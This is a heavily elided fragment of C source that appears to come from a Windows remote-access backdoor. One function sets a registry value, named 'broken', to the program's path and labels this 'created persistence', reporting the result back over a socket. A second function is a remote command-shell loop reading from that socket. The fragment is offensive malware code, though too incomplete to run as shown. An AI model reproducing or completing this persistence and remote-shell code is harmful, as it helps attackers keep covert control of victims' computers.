...
int bootRun(){
    char err[128] = "Failed\n";
    char suc[128] = "created persistence\n";
    ...
    if(RegSetValueEx(NewVal, TEXT("broken"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS){
        RegCloseKey(NewVal);
        send(sock, err, sizeof(err), 0);
        return -1;
    }
...
void Shell(){
    ...
    while(1){
        ...
        if (strncmp("q", buffer, 1) == 0){
            ...
            //run in seperate by creating thread
